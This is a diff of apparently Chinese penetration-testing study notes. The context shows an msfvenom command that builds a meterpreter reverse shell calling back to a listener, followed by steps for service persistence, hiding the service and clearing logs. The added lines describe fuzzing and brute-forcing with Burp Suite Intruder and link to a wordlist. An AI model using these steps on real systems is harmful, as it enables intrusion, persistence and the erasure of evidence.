@@ -32,3 +32,11 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.72.129 LPORT=6688 
    4.开机启动：sc config "shell" start=auto
    5.服务隐藏：![alt text](image.png)
    6.清除日志：meterpreter下输入：clearev
+
+
+   FUZZ：模糊测试技术，所有关于猜的方式  （目录扫描，账号暴力破解，api）
+      FUZZ就需要FUZZ对应的字典：https://pan.baidu.com/s/129c5yjjyi_aiq8YKCNUBvw?pwd=fa7h
+         Burp Suite
+            发送到lntruder：自动测试
+               1.勾选你要FUZZ的地方
+               2、添加你要FUZZ的字典
